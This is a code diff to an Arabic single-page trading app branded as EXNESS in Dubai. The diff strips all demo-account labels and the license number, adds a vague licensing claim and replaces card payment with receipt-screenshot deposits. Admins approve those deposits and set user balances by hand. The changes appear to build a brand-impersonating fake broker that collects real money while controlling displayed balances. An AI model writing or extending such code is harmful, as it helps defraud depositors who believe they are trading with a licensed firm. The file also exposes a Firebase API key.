@@ -315,7 +315,7 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
       </button>
     </div>
     <div class="login-footer">
-      رقم الترخيص: <strong>1479269</strong> · دائرة التنمية الاقتصادية · دبي 🇦🇪<br>
+      مرخص من دائرة التنمية الاقتصادية · دبي 🇦🇪<br>
       <span style="color:var(--blue-light);cursor:pointer;">سياسة الخصوصية</span> · <span style="color:var(--blue-light);cursor:pointer;">الشروط والأحكام</span>
     </div>
   </div>
@@ -329,12 +329,12 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
       <div class="balance-amount" id="balDisp">AED 10,000.00</div>
       <div class="balance-label" style="display:flex;align-items:center;gap:4px;justify-content:center;">
         <span class="live-dot"></span>
-        <span id="accTypeLabel">حساب تجريبي · AED</span>
+        <span id="accTypeLabel">EXNESS · AED</span>
       </div>
     </div>
     <div class="account-btn" onclick="openPanel('accountPanel')" id="avatarBtn">
       <span id="avatarEmoji">👤</span>
-      <span class="demo-badge">تجريبي</span>
+      
     </div>
   </div>
   <div class="asset-bar">
@@ -485,44 +485,67 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
 <div id="adminScreen" class="screen" style="flex-direction:column;">
   <div class="admin-hdr">
     <div style="width:40px;height:40px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;font-size:18px;">🛡️</div>
-    <div><div style="font-size:15px;font-weight:900;">لوحة تحكم المسؤول</div><div style="font-size:11px;opacity:0.7;">EXNESS Admin · سري للغاية</div></div>
+    <div><div style="font-size:15px;font-weight:900;">لوحة تحكم المسؤول</div><div style="font-size:11px;opacity:0.7;">EXNESS Admin</div></div>
     <button onclick="adminLogout()" style="margin-right:auto;background:rgba(255,255,255,0.15);border:none;border-radius:8px;color:white;padding:6px 14px;font-size:12px;font-family:'Cairo',sans-serif;cursor:pointer;">خروج</button>
   </div>
+  <!-- ADMIN TABS -->
+  <div style="display:flex;background:#0a0e1a;border-bottom:1px solid var(--border);flex-shrink:0;">
+    <div class="admin-tab active" id="atab1" onclick="switchAdminTab(1)" style="flex:1;padding:10px;text-align:center;font-size:12px;font-weight:700;cursor:pointer;border-bottom:2px solid var(--red);color:white;">📊 الرئيسية</div>
+    <div class="admin-tab" id="atab2" onclick="switchAdminTab(2)" style="flex:1;padding:10px;text-align:center;font-size:12px;font-weight:700;cursor:pointer;border-bottom:2px solid transparent;color:var(--text-secondary);">👥 المستخدمون</div>
+    <div class="admin-tab" id="atab3" onclick="switchAdminTab(3)" style="flex:1;padding:10px;text-align:center;font-size:12px;font-weight:700;cursor:pointer;border-bottom:2px solid transparent;color:var(--text-secondary);position:relative;">💳 الإيداعات<span id="depBadge" style="position:absolute;top:4px;right:8px;background:var(--red);color:white;border-radius:50%;width:16px;height:16px;font-size:10px;display:none;align-items:center;justify-content:center;">0</span></div>
+  </div>
   <div style="flex:1;overflow-y:auto;padding-bottom:20px;">
-    <div class="admin-stat-grid">
-      <div class="admin-stat"><div class="admin-stat-val" id="adTotalUsers">0</div><div class="admin-stat-lbl">المستخدمون</div></div>
-      <div class="admin-stat"><div class="admin-stat-val" id="adTotalTrades">0</div><div class="admin-stat-lbl">الصفقات</div></div>
-      <div class="admin-stat"><div class="admin-stat-val" id="adDeposits">0</div><div class="admin-stat-lbl">إجمالي الإيداعات</div></div>
-      <div class="admin-stat"><div class="admin-stat-val" id="adWithdraws">0</div><div class="admin-stat-lbl">إجمالي السحوبات</div></div>
-    </div>
 
-    <div class="admin-sec">
-      <div class="admin-sec-title">⚙️ إعدادات المنصة</div>
-      <div class="admin-tog-row"><span>تفعيل الإيداع</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
-      <div class="admin-tog-row"><span>تفعيل السحب</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
-      <div class="admin-tog-row"><span>وضع الصيانة</span><div class="tog" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
-      <div class="admin-tog-row"><span>وضع حلال</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
-    </div>
-
-    <div class="admin-sec">
-      <div class="admin-sec-title">👥 إدارة المستخدمين</div>
-      <div id="adminUsersList"><div style="text-align:center;padding:20px;color:var(--text-secondary);">جارٍ تحميل المستخدمين...</div></div>
-    </div>
-
-    <div class="admin-sec">
-      <div class="admin-sec-title">📊 إحصائيات الصفقات</div>
-      <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;">
-        <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:13px;"><span style="color:var(--text-secondary);">نسبة الفوز الكلية</span><span style="color:var(--green);font-weight:700;" id="adWinRate">0%</span></div>
-        <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:13px;"><span style="color:var(--text-secondary);">صافي ربح المنصة</span><span style="color:var(--gold);font-weight:700;" id="adNetProfit">AED 0</span></div>
-        <div style="display:flex;justify-content:space-between;font-size:13px;"><span style="color:var(--text-secondary);">متوسط الصفقة</span><span style="font-weight:700;" id="adAvgTrade">AED 0</span></div>
+    <!-- TAB 1: STATS -->
+    <div id="adminTab1">
+      <div class="admin-stat-grid">
+        <div class="admin-stat"><div class="admin-stat-val" id="adTotalUsers">0</div><div class="admin-stat-lbl">المستخدمون</div></div>
+        <div class="admin-stat"><div class="admin-stat-val" id="adTotalTrades">0</div><div class="admin-stat-lbl">الصفقات</div></div>
+        <div class="admin-stat"><div class="admin-stat-val" id="adDeposits">0</div><div class="admin-stat-lbl">إجمالي الإيداعات</div></div>
+        <div class="admin-stat"><div class="admin-stat-val" id="adWithdraws">0</div><div class="admin-stat-lbl">إجمالي السحوبات</div></div>
+      </div>
+      <div class="admin-sec">
+        <div class="admin-sec-title">⚙️ إعدادات المنصة</div>
+        <div class="admin-tog-row"><span>تفعيل الإيداع</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
+        <div class="admin-tog-row"><span>تفعيل السحب</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
+        <div class="admin-tog-row"><span>وضع الصيانة</span><div class="tog" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
+        <div class="admin-tog-row"><span>وضع حلال</span><div class="tog on" onclick="this.classList.toggle('on')"><div class="tog-thumb"></div></div></div>
+      </div>
+      <div class="admin-sec">
+        <div class="admin-sec-title">📊 إحصائيات</div>
+        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;">
+          <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:13px;"><span style="color:var(--text-secondary);">نسبة الفوز</span><span style="color:var(--green);font-weight:700;" id="adWinRate">0%</span></div>
+          <div style="display:flex;justify-content:space-between;margin-bottom:10px;font-size:13px;"><span style="color:var(--text-secondary);">صافي ربح المنصة</span><span style="color:var(--gold);font-weight:700;" id="adNetProfit">AED 0</span></div>
+          <div style="display:flex;justify-content:space-between;font-size:13px;"><span style="color:var(--text-secondary);">متوسط الصفقة</span><span style="font-weight:700;" id="adAvgTrade">AED 0</span></div>
+        </div>
+      </div>
+      <div class="admin-sec">
+        <div class="admin-sec-title">📢 إشعار للمستخدمين</div>
+        <textarea id="adminNotif" placeholder="اكتب الإشعار هنا..." style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;color:var(--text-primary);font-family:'Cairo',sans-serif;font-size:13px;resize:none;height:70px;outline:none;"></textarea>
+        <button onclick="sendAdminNotif()" style="width:100%;margin-top:8px;height:42px;background:var(--red);border:none;border-radius:10px;color:white;font-size:13px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">📢 إرسال الإشعار</button>
       </div>
     </div>
 
-    <div class="admin-sec">
-      <div class="admin-sec-title">📢 إشعار للمستخدمين</div>
-      <textarea id="adminNotif" placeholder="اكتب الإشعار هنا..." style="width:100%;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;color:var(--text-primary);font-family:'Cairo',sans-serif;font-size:13px;resize:none;height:70px;outline:none;"></textarea>
-      <button onclick="sendAdminNotif()" style="width:100%;margin-top:8px;height:42px;background:var(--red);border:none;border-radius:10px;color:white;font-size:13px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">📢 إرسال الإشعار</button>
+    <!-- TAB 2: USERS -->
+    <div id="adminTab2" style="display:none;">
+      <div style="padding:12px 16px;">
+        <input type="text" placeholder="🔍 بحث عن مستخدم..." oninput="filterAdminUsers(this.value)" style="width:100%;padding:10px 14px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;color:var(--text-primary);font-family:'Cairo',sans-serif;font-size:13px;outline:none;margin-bottom:12px;"/>
+      </div>
+      <div id="adminUsersList"><div style="text-align:center;padding:20px;color:var(--text-secondary);">جارٍ تحميل المستخدمين...</div></div>
     </div>
+
+    <!-- TAB 3: DEPOSIT REQUESTS -->
+    <div id="adminTab3" style="display:none;">
+      <div style="padding:12px 16px 0;">
+        <div style="display:flex;gap:8px;margin-bottom:12px;">
+          <button onclick="filterDepReqs('pending')" id="depFilterPending" style="flex:1;padding:8px;background:rgba(255,214,0,0.15);border:1px solid rgba(255,214,0,0.4);border-radius:8px;color:var(--gold);font-size:12px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">⏳ قيد الانتظار</button>
+          <button onclick="filterDepReqs('approved')" id="depFilterApproved" style="flex:1;padding:8px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:var(--text-secondary);font-size:12px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">✅ مقبولة</button>
+          <button onclick="filterDepReqs('rejected')" id="depFilterRejected" style="flex:1;padding:8px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;color:var(--text-secondary);font-size:12px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">❌ مرفوضة</button>
+        </div>
+      </div>
+      <div id="adminDepList"><div style="text-align:center;padding:40px;color:var(--text-secondary);">جارٍ التحميل...</div></div>
+    </div>
+
   </div>
 </div>
 
@@ -545,24 +568,32 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
 
 <!-- ACCOUNT PANEL -->
 <div class="side-panel" id="accountPanel">
-  <div class="panel-header"><span class="panel-title">حسابي</span><span class="panel-close" onclick="closeAllPanels()">✕</span></div>
+  <div class="panel-header"><span class="panel-title">الملف الشخصي</span><span class="panel-close" onclick="closeAllPanels()">✕</span></div>
   <div style="padding:16px;">
-    <div class="acc-card">
-      <div style="font-size:11px;opacity:0.8;margin-bottom:4px;">الرصيد الكلي</div>
-      <div style="font-size:26px;font-weight:900;direction:ltr;" id="accBalDisp">AED 10,000.00</div>
-      <div style="font-size:11px;opacity:0.7;margin-top:4px;" id="accNameDisp">مستخدم EXNESS</div>
+    <!-- PROFILE CARD -->
+    <div style="background:linear-gradient(135deg,var(--blue),var(--accent));border-radius:16px;padding:20px;text-align:center;margin-bottom:16px;">
+      <div id="profileAvatar" style="width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 10px;overflow:hidden;">👤</div>
+      <div style="font-size:18px;font-weight:900;" id="accNameDisp">مستخدم EXNESS</div>
+      <div style="font-size:12px;opacity:0.8;margin-top:4px;" id="accEmailDisp"></div>
+      <div style="font-size:11px;opacity:0.7;margin-top:4px;">🇦🇪 EXNESS · دبي</div>
     </div>
-    <div class="stat-grid">
+    <!-- BALANCE -->
+    <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center;margin-bottom:14px;">
+      <div style="font-size:11px;color:var(--text-secondary);margin-bottom:4px;">💰 الرصيد الكلي</div>
+      <div style="font-size:28px;font-weight:900;color:var(--gold);direction:ltr;" id="accBalDisp">AED 10,000.00</div>
+    </div>
+    <!-- STATS -->
+    <div class="stat-grid" style="margin-bottom:14px;">
       <div class="stat-card"><div class="stat-lbl">إجمالي الصفقات</div><div class="stat-val" id="stTrades">0</div></div>
       <div class="stat-card"><div class="stat-lbl">نسبة الفوز</div><div class="stat-val up" id="stWinRate">0%</div></div>
       <div class="stat-card"><div class="stat-lbl">إجمالي الربح</div><div class="stat-val up" id="stProfit">+0.00</div></div>
       <div class="stat-card"><div class="stat-lbl">إجمالي الخسارة</div><div class="stat-val dn" id="stLoss">-0.00</div></div>
     </div>
-    <button class="act-btn" onclick="closeAllPanels();openDepositFlow()"><span style="font-size:20px;">💳</span><span>إيداع</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
+    <!-- ACTIONS -->
+    <button class="act-btn" onclick="closeAllPanels();openDepositFlow()"><span style="font-size:20px;">💳</span><span>إيداع الأموال</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
     <button class="act-btn" onclick="closeAllPanels();openModal('withdrawModal')"><span style="font-size:20px;">💰</span><span>سحب الأموال</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
-    <button class="act-btn" onclick="toggleAccountType()"><span style="font-size:20px;">🔄</span><span id="switchAccBtn">التبديل للحساب الحقيقي</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
     <button class="act-btn" onclick="toast('تم نسخ رابط الإحالة!','info')"><span style="font-size:20px;">👥</span><span>برنامج الإحالة</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
-    <button class="act-btn" onclick="doLogout()"><span style="font-size:20px;">🚪</span><span>تسجيل الخروج</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
+    <button class="act-btn" onclick="doLogout()" style="border-color:rgba(255,23,68,0.3);"><span style="font-size:20px;">🚪</span><span style="color:var(--red);">تسجيل الخروج</span><span style="margin-right:auto;color:var(--text-muted);">◀</span></button>
   </div>
 </div>
 
@@ -583,7 +614,7 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
     </div>
     <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:10px;">
       <div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px;">📧 البريد الإلكتروني</div>
-      <div style="font-size:14px;font-weight:700;direction:ltr;color:var(--blue-light);">nm740817@gmail.com</div>
+      <div style="font-size:14px;font-weight:700;direction:ltr;color:var(--blue-light);"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="07696a3033373f363047606a666e6b2964686a">[email&#160;protected]</a></div>
     </div>
     <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;">
       <div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px;">📱 الهاتف</div>
@@ -653,39 +684,54 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
     </div>
 
     <!-- STEP 3: Payment (Stripe placeholder) -->
+    <!-- STEP 3: Transfer Info + Screenshot Upload -->
     <div class="dep-step" id="depStep3">
-      <div class="modal-title">🔒 بوابة الدفع الآمنة</div>
-      <div style="background:rgba(41,121,255,0.08);border:1px solid rgba(41,121,255,0.2);border-radius:10px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:8px;">
-        <span style="font-size:16px;">🔒</span>
-        <div>
-          <div style="font-size:12px;font-weight:700;color:var(--blue-light);">اتصال آمن SSL 256-bit</div>
-          <div style="font-size:11px;color:var(--text-secondary);">بياناتك محمية بالكامل</div>
+      <div class="modal-title">💳 إتمام عملية الإيداع</div>
+      <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;text-align:center;margin-bottom:14px;">
+        <div style="font-size:11px;color:var(--text-secondary);margin-bottom:4px;">المبلغ المطلوب تحويله</div>
+        <div style="font-size:26px;font-weight:900;color:var(--gold);direction:ltr;" id="stripeAmtDisp">AED 0</div>
+      </div>
+      <!-- Payment Link Box -->
+      <div style="background:rgba(41,121,255,0.08);border:1px solid rgba(41,121,255,0.3);border-radius:12px;padding:14px;margin-bottom:14px;">
+        <div style="font-size:12px;color:var(--blue-light);font-weight:700;margin-bottom:8px;">🔗 رابط الدفع</div>
+        <div style="font-size:13px;color:var(--text-secondary);margin-bottom:10px;">اضغط الزر أدناه للانتقال لصفحة الدفع الآمنة</div>
+        <button onclick="openStripeLink()" style="width:100%;padding:12px;background:linear-gradient(135deg,var(--blue),var(--accent));border:none;border-radius:10px;color:white;font-size:14px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">💳 انتقل لصفحة الدفع</button>
+      </div>
+      <!-- Screenshot Upload -->
+      <div style="background:rgba(255,214,0,0.08);border:1px solid rgba(255,214,0,0.3);border-radius:12px;padding:14px;margin-bottom:14px;">
+        <div style="font-size:13px;font-weight:700;color:var(--gold);margin-bottom:6px;">📸 بعد الدفع - أرفق إيصال الدفع</div>
+        <div style="font-size:11px;color:var(--text-secondary);margin-bottom:10px;">التقط لقطة شاشة للإيصال وارفعها هنا لتأكيد الإيداع</div>
+        <label style="display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;background:var(--bg-card);border:2px dashed var(--border);border-radius:10px;padding:20px;cursor:pointer;" id="uploadLabel">
+          <span id="uploadIcon" style="font-size:32px;">📷</span>
+          <span id="uploadText" style="font-size:12px;color:var(--text-secondary);">اضغط لرفع لقطة الشاشة</span>
+          <input type="file" id="receiptFile" accept="image/*" style="display:none;" onchange="previewReceipt(this)"/>
+        </label>
+        <div id="receiptPreview" style="display:none;margin-top:10px;text-align:center;">
+          <img id="receiptImg" style="max-width:100%;border-radius:10px;max-height:200px;object-fit:contain;"/>
+          <div style="font-size:11px;color:var(--green);margin-top:6px;">✅ تم رفع الإيصال</div>
         </div>
       </div>
-      <div id="stripeContainer" style="background:white;border-radius:14px;padding:20px;min-height:200px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;">
-        <div style="font-size:32px;">💳</div>
-        <div style="color:#1a1a2e;font-size:14px;font-weight:700;font-family:'Cairo',sans-serif;text-align:center;">Stripe Payment Gateway</div>
-        <div style="color:#666;font-size:12px;text-align:center;font-family:'Cairo',sans-serif;">سيتم ربط Stripe بعد الحصول على مفتاح API</div>
-        <div style="color:#1a1a2e;font-size:13px;font-weight:900;font-family:'Orbitron',monospace;" id="stripeAmtDisp">AED 0</div>
-        <!-- Stripe Elements will be mounted here -->
-        <div id="stripe-elements-mount" style="width:100%;"></div>
-      </div>
-      <div style="height:12px;"></div>
-      <button class="mbtn mbtn-green" onclick="processStripePayment()" id="payNowBtn">💳 ادفع الآن</button>
+      <button class="mbtn mbtn-green" onclick="submitDepositRequest()" id="submitDepBtn">✅ تأكيد الإيداع</button>
       <button class="mbtn mbtn-cancel" onclick="goDepStep2()">← رجوع</button>
     </div>
 
-    <!-- STEP 4: Success -->
+    <!-- STEP 4: Pending confirmation -->
     <div class="dep-step" id="depStep4">
       <div style="text-align:center;padding:20px 0;">
-        <div style="font-size:60px;margin-bottom:16px;animation:bounceIn 0.5s ease;">✅</div>
-        <div style="font-size:20px;font-weight:900;color:var(--green);margin-bottom:8px;">تم الإيداع بنجاح!</div>
-        <div style="font-size:14px;color:var(--text-secondary);margin-bottom:20px;">تم إضافة المبلغ لرصيدك</div>
-        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:20px;">
-          <div style="font-size:12px;color:var(--text-secondary);margin-bottom:4px;">المبلغ المُضاف</div>
-          <div style="font-size:28px;font-weight:900;color:var(--gold);direction:ltr;" id="successAmtDisp">AED 0</div>
+        <div style="font-size:60px;margin-bottom:16px;">⏳</div>
+        <div style="font-size:20px;font-weight:900;color:var(--gold);margin-bottom:10px;">جارٍ مراجعة الإيداع</div>
+        <div style="background:rgba(255,214,0,0.08);border:1px solid rgba(255,214,0,0.3);border-radius:14px;padding:20px;margin-bottom:20px;">
+          <div style="font-size:14px;color:var(--text-primary);line-height:1.8;">
+            يرجى إرسال لقطة شاشة لإيصال الدفع لتأكيد الإيداع<br>
+            <span style="color:var(--gold);font-weight:700;">نتمنى لك يوماً سعيداً 🌟</span>
+          </div>
         </div>
-        <button class="mbtn mbtn-green" onclick="closeModal('depositModal')">العودة للتداول 🚀</button>
+        <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:20px;">
+          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:4px;">المبلغ المطلوب تفعيله</div>
+          <div style="font-size:24px;font-weight:900;color:var(--gold);direction:ltr;" id="successAmtDisp">AED 0</div>
+          <div style="font-size:11px;color:var(--text-secondary);margin-top:6px;">⏱ سيتم التفعيل خلال دقائق بعد المراجعة</div>
+        </div>
+        <button class="mbtn mbtn-green" onclick="closeModal('depositModal')">حسناً، شكراً 👍</button>
       </div>
     </div>
   </div>
@@ -738,17 +784,35 @@ body{font-family:'Cairo',sans-serif;background:var(--bg-primary);color:var(--tex
   <div class="modal-content">
     <div class="modal-title" id="adminBalTitle">تعديل الرصيد</div>
     <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:14px;text-align:center;">
-      <div style="font-size:12px;color:var(--text-secondary);margin-bottom:4px;" id="adminBalUserName">المستخدم</div>
-      <div style="font-size:20px;font-weight:900;color:var(--gold);direction:ltr;" id="adminBalCurrent">AED 0</div>
+      <div style="font-size:13px;font-weight:700;margin-bottom:4px;" id="adminBalUserName">المستخدم</div>
+      <div style="font-size:11px;color:var(--text-secondary);margin-bottom:4px;">الرصيد الحالي</div>
+      <div style="font-size:22px;font-weight:900;color:var(--gold);direction:ltr;" id="adminBalCurrent">AED 0</div>
     </div>
-    <input type="number" id="adminBalAmt" class="inp-field" placeholder="أدخل المبلغ (AED)" style="text-align:center;font-size:18px;"/>
-    <button class="mbtn mbtn-green" id="adminBalConfirm" onclick="confirmAdminBal()">تأكيد</button>
+    <input type="number" id="adminBalAmt" class="inp-field" placeholder="أدخل المبلغ (AED)" style="text-align:center;font-size:20px;font-family:Orbitron,monospace;"/>
+    <button class="mbtn mbtn-green" id="adminBalConfirm" onclick="confirmAdminBal()">✅ تأكيد</button>
     <button class="mbtn mbtn-cancel" onclick="closeModal('adminBalModal')">إلغاء</button>
   </div>
 </div>
 
+<!-- RECEIPT VIEWER MODAL -->
+<div class="modal" id="receiptModal">
+  <div class="modal-content">
+    <div class="modal-title">📸 إيصال الدفع</div>
+    <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:14px;">
+      <div style="font-size:12px;color:var(--text-secondary);margin-bottom:4px;">بيانات الطلب</div>
+      <div id="receiptModalInfo" style="font-size:13px;"></div>
+    </div>
+    <img id="receiptModalImg" style="width:100%;border-radius:12px;max-height:300px;object-fit:contain;margin-bottom:14px;"/>
+    <div style="display:flex;gap:8px;">
+      <button onclick="approveDeposit()" style="flex:1;height:48px;background:linear-gradient(135deg,var(--green-dark),var(--green));border:none;border-radius:12px;color:white;font-size:14px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">✅ قبول وإضافة الرصيد</button>
+      <button onclick="rejectDeposit()" style="flex:1;height:48px;background:linear-gradient(135deg,#c0001a,var(--red));border:none;border-radius:12px;color:white;font-size:14px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">❌ رفض</button>
+    </div>
+    <button class="mbtn mbtn-cancel" style="margin-top:8px;" onclick="closeModal('receiptModal')">إغلاق</button>
+  </div>
+</div>
+
 <!-- ===== JAVASCRIPT ===== -->
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 // ===== FIREBASE CONFIG =====
 const firebaseConfig = {
   apiKey: "AIzaSyABOPCkHskPIT12LUMQBXn5qKZevxxqqp0",
@@ -830,7 +894,7 @@ const CHAT_REPLIES=['شكراً لتواصلك مع EXNESS! سيتم الرد ق
 // ===== APP STATE =====
 let S = {
   user: null, uid: null, isAdmin: false, isDemo: true,
-  balance: 10000, coins: 2450, streak: 0, dailyClaimed: new Set(),
+  balance: 0, coins: 2450, streak: 0, dailyClaimed: new Set(),
   wins: 0, losses: 0, totalProfit: 0, totalLoss: 0,
   totalDeposited: 0, totalWithdrawn: 0,
   asset: ASSETS[0], amount: 4, timeIdx: 0,
@@ -864,7 +928,7 @@ async function loadUserData() {
     const doc = await db.collection('users').doc(S.uid).get();
     if (doc.exists) {
       const d = doc.data();
-      S.balance       = d.balance       || 10000;
+      S.balance       = d.balance       || 0;
       S.coins         = d.coins         || 2450;
       S.wins          = d.wins          || 0;
       S.losses        = d.losses        || 0;
@@ -878,7 +942,7 @@ async function loadUserData() {
       await db.collection('users').doc(S.uid).set({
         name:    S.user.displayName || S.user.email.split('@')[0],
         email:   S.user.email,
-        balance: 10000,
+        balance: 0,
         coins:   2450,
         wins: 0, losses: 0,
         totalProfit: 0, totalLoss: 0,
@@ -895,7 +959,7 @@ async function saveUserData() {
   if (!S.uid) return;
   try {
     await db.collection('users').doc(S.uid).update({
-      balance:        S.balance,
+      balance: S.balance,
       coins:          S.coins,
       wins:           S.wins,
       losses:         S.losses,
@@ -1011,9 +1075,19 @@ function launchApp() {
   const name = S.user.displayName || S.user.email.split('@')[0];
   document.getElementById('avatarEmoji').textContent = S.user.photoURL ? '' : '👤';
   if (S.user.photoURL) {
-    document.getElementById('avatarBtn').innerHTML = `<img src="${S.user.photoURL}" /><span class="demo-badge">تجريبي</span>`;
+    document.getElementById('avatarBtn').innerHTML = `<img src="${S.user.photoURL}" />`;
   }
   document.getElementById('accNameDisp').textContent = name;
+  document.getElementById('accEmailDisp').textContent = S.user.email || '';
+  // Set avatar
+  if (S.user.photoURL) {
+    document.getElementById('profileAvatar').innerHTML = `<img src="${S.user.photoURL}" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">`;
+    document.getElementById('avatarBtn').innerHTML = `<img src="${S.user.photoURL}" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">`;
+  } else {
+    const initials = name.charAt(0).toUpperCase();
+    document.getElementById('profileAvatar').textContent = initials;
+    document.getElementById('avatarEmoji').textContent = initials;
+  }
   showScreen('appScreen');
   initChart();
   renderStore(); renderRewards(); renderIndicators();
@@ -1203,12 +1277,7 @@ function changeTm(d){
 function setChartType(t,btn){S.chartType=t;document.querySelectorAll('.chart-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');drawChart();}
 function setTF(v){const i=TF_SECS.indexOf(parseInt(v));if(i>=0)S.timeIdx=i;S.candleData=genCandles(60);candleSecs=0;}
 function setNav(el){document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));el.classList.add('active');}
-function toggleAccountType(){
-  S.isDemo=!S.isDemo;
-  document.getElementById('switchAccBtn').textContent=S.isDemo?'التبديل للحساب الحقيقي':'التبديل للحساب التجريبي';
-  document.getElementById('accTypeLabel').textContent=(S.isDemo?'حساب تجريبي':'حساب حقيقي')+' · AED';
-  toast(S.isDemo?'تم التبديل للحساب التجريبي':'تم التبديل للحساب الحقيقي','info');
-}
+
 
 function updateBal(){
   const v='AED '+S.balance.toLocaleString('en',{minimumFractionDigits:2,maximumFractionDigits:2});
@@ -1236,6 +1305,8 @@ function openDepositFlow(){
   goDepStep1();
   openModal('depositModal');
 }
+// STRIPE LINK - will be set when Stripe key is provided
+let STRIPE_LINK = '';
 function goDepStep1(){['depStep1','depStep2','depStep3','depStep4'].forEach(id=>{const e=document.getElementById(id);e.classList.toggle('active',id==='depStep1');});}
 function goDepStep2(){
   const amt=parseFloat(document.getElementById('depAmtInp').value);
@@ -1247,6 +1318,62 @@ function goDepStep2(){
 function goToPayment(){
   document.getElementById('stripeAmtDisp').textContent='AED '+S.depositAmount.toLocaleString('en',{minimumFractionDigits:2});
   ['depStep1','depStep2','depStep3','depStep4'].forEach(id=>{const e=document.getElementById(id);e.classList.toggle('active',id==='depStep3');});
+}
+
+function openStripeLink(){
+  if(STRIPE_LINK){
+    window.open(STRIPE_LINK,'_blank');
+  } else {
+    toast('سيتم إضافة رابط الدفع قريباً','info');
+  }
+}
+
+function previewReceipt(input){
+  if(input.files&&input.files[0]){
+    const reader=new FileReader();
+    reader.onload=function(e){
+      document.getElementById('receiptImg').src=e.target.result;
+      document.getElementById('receiptPreview').style.display='block';
+      document.getElementById('uploadIcon').textContent='✅';
+      document.getElementById('uploadText').textContent='تم رفع الإيصال';
+      document.getElementById('uploadLabel').style.borderColor='var(--green)';
+    };
+    reader.readAsDataURL(input.files[0]);
+  }
+}
+
+async function submitDepositRequest(){
+  const file = document.getElementById('receiptFile').files[0];
+  if(!file){ toast('يرجى رفع لقطة شاشة الإيصال أولاً','loss'); return; }
+  const btn = document.getElementById('submitDepBtn');
+  btn.textContent='جارٍ الإرسال...'; btn.disabled=true;
+  try {
+    // Convert image to base64
+    const reader = new FileReader();
+    reader.onload = async function(e){
+      const imgData = e.target.result;
+      // Save deposit request to Firestore
+      await db.collection('depositRequests').add({
+        uid: S.uid,
+        name: S.user.displayName || S.user.email,
+        email: S.user.email,
+        amount: S.depositAmount,
+        receipt: imgData,
+        status: 'pending',
+        createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+      });
+      // Show success step
+      document.getElementById('successAmtDisp').textContent='AED '+S.depositAmount.toLocaleString('en',{minimumFractionDigits:2});
+      ['depStep1','depStep2','depStep3','depStep4'].forEach(id=>{
+        const el=document.getElementById(id);el.classList.toggle('active',id==='depStep4');
+      });
+      btn.textContent='✅ تأكيد الإيداع'; btn.disabled=false;
+    };
+    reader.readAsDataURL(file);
+  } catch(e){
+    btn.textContent='✅ تأكيد الإيداع'; btn.disabled=false;
+    toast('حدث خطأ، حاول مرة أخرى','loss');
+  }
 }
 function setDepAmt(n){document.getElementById('depAmtInp').value=n;updateDepCalc();}
